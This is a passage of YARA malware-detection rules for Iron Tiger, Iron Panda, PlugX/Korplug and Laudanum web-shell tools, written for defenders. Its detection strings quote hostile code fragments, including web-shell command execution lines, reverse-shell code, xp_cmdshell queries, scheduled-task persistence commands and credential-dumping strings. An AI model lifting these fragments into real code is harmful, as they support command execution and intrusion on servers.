		$str3 = "protected void DGCoW(object sender,EventArgs e)" nocase wide ascii
	condition:
		any of ($str*)
}

rule IronTiger_ChangePort_Toolkit_driversinstall
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - Changeport Toolkit driverinstall"	
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "openmydoor" nocase wide ascii
		$str2 = "Install service error" nocase wide ascii
		$str3 = "start remove service" nocase wide ascii
		$str4 = "NdisVersion" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (2 of ($str*))
}

rule IronTiger_ChangePort_Toolkit_ChangePortExe
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - Toolkit ChangePort"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "Unable to alloc the adapter!" nocase wide ascii
		$str2 = "Wait for master fuck" nocase wide ascii
		$str3 = "xx.exe <HOST> <PORT>" nocase wide ascii
		$str4 = "chkroot2007" nocase wide ascii
		$str5 = "Door is bind on %s" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (2 of ($str*))
}

rule IronTiger_dllshellexc2010
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "dllshellexc2010 Exchange backdoor + remote shell"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "Microsoft.Exchange.Clients.Auth.dll" nocase ascii wide
		$str2 = "Dllshellexc2010" nocase wide ascii
		$str3 = "Users\\ljw\\Documents" nocase wide ascii
		$bla1 = "please input path" nocase wide ascii
		$bla2 = "auth.owa" nocase wide ascii
	condition:
		(uint16(0) == 0x5a4d) and ((any of ($str*)) or (all of ($bla*)))
}

rule IronTiger_dnstunnel
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "This rule detects a dns tunnel tool used in Operation Iron Tiger"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "\\DnsTunClient\\" nocase wide ascii
		$str2 = "\\t-DNSTunnel\\" nocase wide ascii
		$str3 = "xssok.blogspot" nocase wide ascii
		$str4 = "dnstunclient" nocase wide ascii
		$mistake1 = "because of error, can not analysis" nocase wide ascii
		$mistake2 = "can not deal witn the error" nocase wide ascii
		$mistake3 = "the other retun one RST" nocase wide ascii
		$mistake4 = "Coversation produce one error" nocase wide ascii
		$mistake5 = "Program try to use the have deleted the buffer" nocase wide ascii
	condition:
		(uint16(0) == 0x5a4d) and ((any of ($str*)) or (any of ($mistake*)))
}

rule IronTiger_EFH3_encoder
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger EFH3 Encoder"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "EFH3 [HEX] [SRCFILE] [DSTFILE]" nocase wide ascii
		$str2 = "123.EXE 123.EFH" nocase wide ascii
		$str3 = "ENCODER: b[i]: = " nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (any of ($str*))
}

rule IronTiger_GetPassword_x64
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - GetPassword x64"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "(LUID ERROR)" nocase wide ascii
		$str2 = "Users\\K8team\\Desktop\\GetPassword" nocase wide ascii
		$str3 = "Debug x64\\GetPassword.pdb" nocase wide ascii
		$bla1 = "Authentication Package:" nocase wide ascii
		$bla2 = "Authentication Domain:" nocase wide ascii
		$bla3 = "* Password:" nocase wide ascii
		$bla4 = "Primary User:" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))
}

rule IronTiger_GetUserInfo
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - GetUserInfo"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "getuserinfo username" nocase wide ascii
		$str2 = "joe@joeware.net" nocase wide ascii
		$str3 = "If . specified for userid," nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (any of ($str*))
}

rule IronTiger_Gh0stRAT_variant
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "This is a detection for a s.exe variant seen in Op. Iron Tiger"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "Game Over Good Luck By Wind" nocase wide ascii
		$str2 = "ReleiceName" nocase wide ascii
		$str3 = "jingtisanmenxiachuanxiao.vbs" nocase wide ascii
		$str4 = "Winds Update" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (any of ($str*))
}

rule IronTiger_GTalk_Trojan
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - GTalk Trojan"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "gtalklite.com" nocase wide ascii
		$str2 = "computer=%s&lanip=%s&uid=%s&os=%s&data=%s" nocase wide ascii
		$str3 = "D13idmAdm" nocase wide ascii
		$str4 = "Error: PeekNamedPipe failed with %i" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (2 of ($str*))
}

rule IronTiger_HTTPBrowser_Dropper
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - HTTPBrowser Dropper"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = ".dllUT" nocase wide ascii
		$str2 = ".exeUT" nocase wide ascii
		$str3 = ".urlUT" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (2 of ($str*))
}

rule IronTiger_HTTP_SOCKS_Proxy_soexe
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Toolset - HTTP SOCKS Proxy soexe"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "listen SOCKET error." nocase wide ascii
		$str2 = "WSAAsyncSelect SOCKET error." nocase wide ascii
		$str3 = "new SOCKETINFO error!" nocase wide ascii
		$str4 = "Http/1.1 403 Forbidden" nocase wide ascii
		$str5 = "Create SOCKET error." nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (3 of ($str*))
}

rule IronTiger_NBDDos_Gh0stvariant_dropper
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - NBDDos Gh0stvariant Dropper"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "This service can't be stoped." nocase wide ascii
		$str2 = "Provides support for media palyer" nocase wide ascii
		$str4 = "CreaetProcess Error" nocase wide ascii
		$bla1 = "Kill You" nocase wide ascii
		$bla2 = "%4.2f GB" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))
}

rule IronTiger_PlugX_DosEmulator
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - PlugX DosEmulator"	
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "Dos Emluator Ver" nocase wide ascii
		$str2 = "\\PIPE\\FASTDOS" nocase wide ascii
		$str3 = "FastDos.cpp" nocase wide ascii
		$str4 = "fail,error code = %d." nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (any of ($str*))
}

rule IronTiger_PlugX_FastProxy
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - PlugX FastProxy"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "SAFEPROXY HTServerTimer Quit!" nocase wide ascii
		$str2 = "Useage: %s pid" nocase wide ascii
		$str3 = "%s PORT[%d] TO PORT[%d] SUCCESS!" nocase wide ascii
		$str4 = "p0: port for listener" nocase wide ascii
		$str5 = "\\users\\whg\\desktop\\plug\\" nocase wide ascii
		$str6 = "[+Y] cwnd : %3d, fligth:" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (any of ($str*))
}

rule IronTiger_PlugX_Server
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - PlugX Server"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "\\UnitFrmManagerKeyLog.pas" nocase wide ascii
		$str2 = "\\UnitFrmManagerRegister.pas" nocase wide ascii
		$str3 = "Input Name..." nocase wide ascii
		$str4 = "New Value#" nocase wide ascii
		$str5 = "TThreadRControl.Execute SEH!!!" nocase wide ascii
		$str6 = "\\UnitFrmRControl.pas" nocase wide ascii
		$str7 = "OnSocket(event is error)!" nocase wide ascii
		$str8 = "Make 3F Version Ok!!!" nocase wide ascii
		$str9 = "PELEASE DO NOT CHANGE THE DOCAMENT" nocase wide ascii
		$str10 = "Press [Ok] Continue Run, Press [Cancel] Exit" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (2 of ($str*))
}

rule IronTiger_ReadPWD86
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - ReadPWD86"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "Fail To Load LSASRV" nocase wide ascii
		$str2 = "Fail To Search LSASS Data" nocase wide ascii
		$str3 = "User Principal" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and (all of ($str*))
}

rule IronTiger_Ring_Gh0stvariant
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Malware - Ring Gh0stvariant"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "RING RAT Exception" nocase wide ascii
		$str2 = "(can not update server recently)!" nocase wide ascii
		$str4 = "CreaetProcess Error" nocase wide ascii
		$bla1 = "Sucess!" nocase wide ascii
		$bla2 = "user canceled!" nocase wide ascii
	condition:
		uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))
}

rule IronTiger_wmiexec
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "Iron Tiger Tool - wmi.vbs detection"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "Temp Result File , Change it to where you like" nocase wide ascii
		$str2 = "wmiexec" nocase wide ascii
		$str3 = "By. Twi1ight" nocase wide ascii
		$str4 = "[both mode] ,delay TIME to read result" nocase wide ascii
		$str5 = "such as nc.exe or Trojan" nocase wide ascii
		$str6 = "+++shell mode+++" nocase wide ascii
		$str7 = "win2008 fso has no privilege to delete file" nocase wide ascii
	condition:
		2 of ($str*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-09-16
	Identifier: Iron Panda
*/

/* Rule Set ----------------------------------------------------------------- */

rule IronPanda_DNSTunClient {
	meta:
		description = "Iron Panda malware DnsTunClient - file named.exe"
		author = "Florian Roth"
		reference = "https://goo.gl/E4qia9"
		date = "2015-09-16"
		score = 80
		hash = "a08db49e198068709b7e52f16d00a10d72b4d26562c0d82b4544f8b0fb259431"
	strings:
		$s1 = "dnstunclient -d or -domain <domain>" fullword ascii
		$s2 = "dnstunclient -ip <server ip address>" fullword ascii
		$s3 = "C:\\Windows\\System32\\cmd.exe /C schtasks /create /tn \"\\Microsoft\\Windows\\PLA\\System\\Microsoft Windows\" /tr " fullword ascii
		$s4 = "C:\\Windows\\System32\\cmd.exe /C schtasks /create /tn \"Microsoft Windows\" /tr " fullword ascii
		$s5 = "taskkill /im conime.exe" fullword ascii
		$s6 = "\\dns control\\t-DNSTunnel\\DnsTunClient\\DnsTunClient.cpp" fullword ascii
		$s7 = "UDP error:can not bing the port(if there is unclosed the bind process?)" fullword ascii
		$s8 = "use error domain,set domain pls use -d or -domain mark(Current: %s,recv %s)" fullword ascii
		$s9 = "error: packet num error.the connection have condurt,pls try later" fullword ascii
		$s10 = "Coversation produce one error:%s,coversation fail" fullword ascii
		$s11 = "try to add many same pipe to select group(or mark is too easy)." fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 400KB and 2 of them ) 
		or
		5 of them
}

rule IronPanda_Malware1 {
	meta:
		description = "Iron Panda Malware"
		author = "Florian Roth"
		reference = "https://goo.gl/E4qia9"
		date = "2015-09-16"
		hash = "a0cee5822ddf254c254a5a0b7372c9d2b46b088a254a1208cb32f5fe7eca848a"
	strings:
		$x1 = "activedsimp.dll" fullword wide
		$s1 = "get_BadLoginAddress" fullword ascii
		$s2 = "get_LastFailedLogin" fullword ascii
		$s3 = "ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED" fullword ascii
		$s4 = "get_PasswordExpirationDate" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule IronPanda_Webshell_JSP {
	meta:
		description = "Iron Panda Malware JSP"
		author = "Florian Roth"
		reference = "https://goo.gl/E4qia9"
		date = "2015-09-16"
		hash = "3be95477e1d9f3877b4355cff3fbcdd3589bb7f6349fd4ba6451e1e9d32b7fa6"
	strings:
		$s1 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
		$s2 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
		$s3 = "Bin_ExecSql(\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\");" fullword ascii
	condition:
		filesize < 330KB and 1 of them
}

rule IronPanda_Malware_Htran {
	meta:
		description = "Iron Panda Malware Htran"
		author = "Florian Roth"
		reference = "https://goo.gl/E4qia9"
		date = "2015-09-16"
		hash = "7903f94730a8508e9b272b3b56899b49736740cea5037ea7dbb4e690bcaf00e7"
	strings:
		$s1 = "[-] Gethostbyname(%s) error:%s" fullword ascii
		$s2 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
		$s3 = "-slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
		$s4 = "[-] ERROR: Must supply logfile name." fullword ascii
		$s5 = "[SERVER]connection to %s:%d error" fullword ascii
		$s6 = "[+] Make a Connection to %s:%d...." fullword ascii
		$s7 = "[+] Waiting another Client on port:%d...." fullword ascii
		$s8 = "[+] Accept a Client on port %d from %s" fullword ascii
		$s9 = "[+] Make a Connection to %s:%d ......" fullword ascii
		$s10 = "cmshared_get_ptr_from_atom" fullword ascii
		$s11 = "_cmshared_get_ptr_from_atom" fullword ascii
		$s12 = "[+] OK! I Closed The Two Socket." fullword ascii
		$s13 = "[-] TransmitPort invalid." fullword ascii
		$s14 = "[+] Waiting for Client on port:%d ......" fullword ascii
	condition:
		 ( uint16(0) == 0x5a4d and filesize < 125KB and 3 of them ) 
		 or 
		 5 of them
}

rule IronPanda_Malware2 {
	meta:
		description = "Iron Panda Malware"
		author = "Florian Roth"
		reference = "https://goo.gl/E4qia9"
		date = "2015-09-16"
		hash = "a89c21dd608c51c4bf0323d640f816e464578510389f9edcf04cd34090decc91"
	strings:
		$s0 = "\\setup.exe" fullword ascii
		$s1 = "msi.dll.urlUT" fullword ascii
		$s2 = "msi.dllUT" fullword ascii
		$s3 = "setup.exeUT" fullword ascii
		$s4 = "/c del /q %s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 180KB and all of them
}

rule IronPanda_Malware3 {
	meta:
		description = "Iron Panda Malware"
		author = "Florian Roth"
		reference = "https://goo.gl/E4qia9"
		date = "2015-09-16"
		hash = "5cd2af844e718570ae7ba9773a9075738c0b3b75c65909437c43201ce596a742"
	strings:
		$s0 = "PluginDeflater.exe" fullword wide
		$s1 = ".Deflated" fullword wide
		$s2 = "PluginDeflater" fullword ascii
		$s3 = "DeflateStream" fullword ascii /* Goodware String - occured 1 times */
		$s4 = "CompressionMode" fullword ascii /* Goodware String - occured 4 times */
		$s5 = "System.IO.Compression" fullword ascii /* Goodware String - occured 6 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 10KB and all of them
}

rule IronPanda_Malware4 {
	meta:
		description = "Iron Panda Malware"
		author = "Florian Roth"
		reference = "https://goo.gl/E4qia9"
		date = "2015-09-16"
		hash = "0d6da946026154416f49df2283252d01ecfb0c41c27ef3bc79029483adc2240c"
	strings:
		$s0 = "TestPlugin.dll" fullword wide
		$s1 = "<a href='http://www.baidu.com'>aasd</a>" fullword wide
		$s2 = "Zcg.Test.AspxSpyPlugins" fullword ascii
		$s6 = "TestPlugin" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 10KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule rtf_Kaba_jDoe
{
meta:
	author = "@patrickrolsen"
	maltype = "APT.Kaba"
	filetype = "RTF"
	version = "0.1"
	description = "fe439af268cd3de3a99c21ea40cf493f, d0e0e68a88dce443b24453cc951cf55f, b563af92f144dea7327c9597d9de574e, and def0c9a4c732c3a1e8910db3f9451620"
	date = "2013-12-10"
strings:
  	$magic1 = { 7b 5c 72 74 30 31 } // {\rt01
  	$magic2 = { 7b 5c 72 74 66 31 } // {\rtf1
  	$magic3 = { 7b 5c 72 74 78 61 33 } // {\rtxa3
  	$author1 = { 4A 6F 68 6E 20 44 6F 65 } // "John Doe"
  	$author2 = { 61 75 74 68 6f 72 20 53 74 6f 6e 65 } // "author Stone"
	$string1 = { 44 30 [16] 43 46 [23] 31 31 45 }
condition:
  	($magic1 or $magic2 or $magic3 at 0) and all of ($author*) and $string1
} 
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule Korplug_FAST {
    meta:
        description = "Rule to detect Korplug/PlugX FAST variant"
        author = "Florian Roth"
        date = "2015-08-20"
        hash = "c437465db42268332543fbf6fd6a560ca010f19e0fd56562fb83fb704824b371"
    strings:
        $x1 = "%s\\rundll32.exe \"%s\", ShadowPlay" fullword ascii

        $a1 = "ShadowPlay" fullword ascii

        $s1 = "%s\\rundll32.exe \"%s\"," fullword ascii
        $s2 = "nvdisps.dll" fullword ascii
        $s3 = "%snvdisps.dll" fullword ascii
        $s4 = "\\winhlp32.exe" fullword ascii
        $s5 = "nvdisps_user.dat" fullword ascii
        $s6 = "%snvdisps_user.dat" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize < 500KB and 
        (
            $x1 or
            ($a1 and 1 of ($s*)) or 
            4 of ($s*)
        )
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule asp_file {
	meta:
		description = "Laudanum Injector Tools - file file.asp"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "ff5b1a9598735440bdbaa768b524c639e22f53c5"
	strings:
		$s1 = "' *** Written by Tim Medin <tim@counterhack.com>" fullword ascii
		$s2 = "Response.BinaryWrite(stream.Read)" fullword ascii
		$s3 = "Response.Write(Response.Status & Request.ServerVariables(\"REMOTE_ADDR\"))" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "%><a href=\"<%=Request.ServerVariables(\"URL\")%>\">web root</a><br/><%" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "set folder = fso.GetFolder(path)" fullword ascii
		$s6 = "Set file = fso.GetFile(filepath)" fullword ascii
	condition:
		uint16(0) == 0x253c and filesize < 30KB and 5 of them
}

rule php_killnc {
	meta:
		description = "Laudanum Injector Tools - file killnc.php"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "c0dee56ee68719d5ec39e773621ffe40b144fda5"
	strings:
		$s1 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
		$s3 = "<?php echo exec('killall nc');?>" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "<title>Laudanum Kill nc</title>" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "foreach ($allowedIPs as $IP) {" fullword ascii
	condition:
		filesize < 15KB and 4 of them
}

rule asp_shell {
	meta:
		description = "Laudanum Injector Tools - file shell.asp"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "8bf1ff6f8edd45e3102be5f8a1fe030752f45613"
	strings:
		$s1 = "<form action=\"shell.asp\" method=\"POST\" name=\"shell\">" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "%ComSpec% /c dir" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "Set objCmd = wShell.Exec(cmd)" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "Server.ScriptTimeout = 180" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "cmd = Request.Form(\"cmd\")" fullword ascii /* PEStudio Blacklist: strings */
		$s6 = "' ***  http://laudanum.secureideas.net" fullword ascii
		$s7 = "Dim wshell, intReturn, strPResult" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 15KB and 4 of them
}

rule settings {
	meta:
		description = "Laudanum Injector Tools - file settings.php"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "588739b9e4ef2dbb0b4cf630b73295d8134cc801"
	strings:
		$s1 = "Port: <input name=\"port\" type=\"text\" value=\"8888\">" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "<li>Reverse Shell - " fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "<li><a href=\"<?php echo plugins_url('file.php', __FILE__);?>\">File Browser</a>" ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 13KB and all of them
}

rule asp_proxy {
	meta:
		description = "Laudanum Injector Tools - file proxy.asp"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "51e97040d1737618b1775578a772fa6c5a31afd8"
	strings:
		$s1 = "'response.write \"<br/>  -value:\" & request.querystring(key)(j)" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "q = q & \"&\" & key & \"=\" & request.querystring(key)(j)" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "for each i in Split(http.getAllResponseHeaders, vbLf)" fullword ascii
		$s4 = "'urlquery = mid(urltemp, instr(urltemp, \"?\") + 1)" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "s = urlscheme & urlhost & urlport & urlpath" fullword ascii /* PEStudio Blacklist: strings */
		$s6 = "Set http = Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 50KB and all of them
}

rule cfm_shell {
	meta:
		description = "Laudanum Injector Tools - file shell.cfm"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "885e1783b07c73e7d47d3283be303c9719419b92"
	strings:
		$s1 = "Executable: <Input type=\"text\" name=\"cmd\" value=\"cmd.exe\"><br>" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "<cfif ( #suppliedCode# neq secretCode )>" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "<cfif IsDefined(\"form.cmd\")>" fullword ascii
	condition:
		filesize < 20KB and 2 of them
}

rule aspx_shell {
	meta:
		description = "Laudanum Injector Tools - file shell.aspx"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "076aa781a004ecb2bf545357fd36dcbafdd68b1a"
	strings:
		$s1 = "remoteIp = HttpContext.Current.Request.Headers[\"X-Forwarded-For\"].Split(new" ascii /* PEStudio Blacklist: strings */
		$s2 = "remoteIp = Request.UserHostAddress;" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "<form method=\"post\" name=\"shell\">" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "<body onload=\"document.shell.c.focus()\">" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 20KB and all of them
}

rule php_shell {
	meta:
		description = "Laudanum Injector Tools - file shell.php"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "dc5c03a21267d024ef0f5ab96a34e3f6423dfcd6"
	strings:
		$s1 = "command_hist[current_line] = document.shell.command.value;" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "array_unshift($_SESSION['history'], $command);" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 40KB and all of them
}

rule php_reverse_shell {
	meta:
		description = "Laudanum Injector Tools - file php-reverse-shell.php"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "3ef03bbe3649535a03315dcfc1a1208a09cea49d"
	strings:
		$s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "$input = fread($pipes[1], $chunk_size);" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 15KB and all of them
}

rule php_dns {
	meta:
		description = "Laudanum Injector Tools - file dns.php"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "01d5d16d876c55d77e094ce2b9c237de43b21a16"
	strings:
		$s1 = "$query = isset($_POST['query']) ? $_POST['query'] : '';" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "$result = dns_get_record($query, $types[$type], $authns, $addtl);" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "foreach (array_keys($types) as $t) {" fullword ascii
	condition:
		filesize < 15KB and all of them
}

rule WEB_INF_web {
	meta:
		description = "Laudanum Injector Tools - file web.xml"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "0251baed0a16c451f9d67dddce04a45dc26cb4a3"
	strings:
		$s1 = "<servlet-name>Command</servlet-name>" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "<jsp-file>/cmd.jsp</jsp-file>" fullword ascii
	condition:
		filesize < 1KB and all of them
}

rule jsp_cmd {
	meta:
		description = "Laudanum Injector Tools - file cmd.war"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "55e4c3dc00cfab7ac16e7cfb53c11b0c01c16d3d"
	strings:
		$s0 = "cmd.jsp}" fullword ascii
		$s1 = "cmd.jspPK" fullword ascii
		$s2 = "WEB-INF/web.xml" fullword ascii /* Goodware String - occured 1 times */
		$s3 = "WEB-INF/web.xmlPK" fullword ascii /* Goodware String - occured 1 times */
		$s4 = "META-INF/MANIFEST.MF" fullword ascii /* Goodware String - occured 12 times */
	condition:
		uint16(0) == 0x4b50 and filesize < 2KB and all of them
}

rule laudanum {
	meta:
		description = "Laudanum Injector Tools - file laudanum.php"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "fd498c8b195967db01f68776ff5e36a06c9dfbfe"
	strings:
		$s1 = "public function __activate()" fullword ascii
		$s2 = "register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 5KB and all of them
}

rule php_file {
	meta:
		description = "Laudanum Injector Tools - file file.php"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "7421d33e8007c92c8642a36cba7351c7f95a4335"
	strings:
		$s1 = "$allowedIPs =" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "<a href=\"<?php echo $_SERVER['PHP_SELF']  ?>\">Home</a><br/>" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "$dir  = isset($_GET[\"dir\"])  ? $_GET[\"dir\"]  : \".\";" fullword ascii
		$s4 = "$curdir .= substr($curdir, -1) != \"/\" ? \"/\" : \"\";" fullword ascii
	condition:
		filesize < 10KB and all of them
}

rule warfiles_cmd {
	meta:
		description = "Laudanum Injector Tools - file cmd.jsp"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "3ae3d837e7b362de738cf7fad78eded0dccf601f"
	strings:
		$s1 = "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">" fullword ascii
		$s4 = "String disr = dis.readLine();" fullword ascii
	condition:
		filesize < 2KB and all of them
}

rule asp_dns {
	meta:
		description = "Laudanum Injector Tools - file dns.asp"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "5532154dd67800d33dace01103e9b2c4f3d01d51"
	strings:
		$s1 = "command = \"nslookup -type=\" & qtype & \" \" & query " fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "Set objCmd = objWShell.Exec(command)" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "Response.Write command & \"<br>\"" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "<form name=\"dns\" method=\"POST\">" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 21KB and all of them
}

rule php_reverse_shell_2 {
	meta:
		description = "Laudanum Injector Tools - file php-reverse-shell.php"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "025db3c3473413064f0606d93d155c7eb5049c42"
	strings:
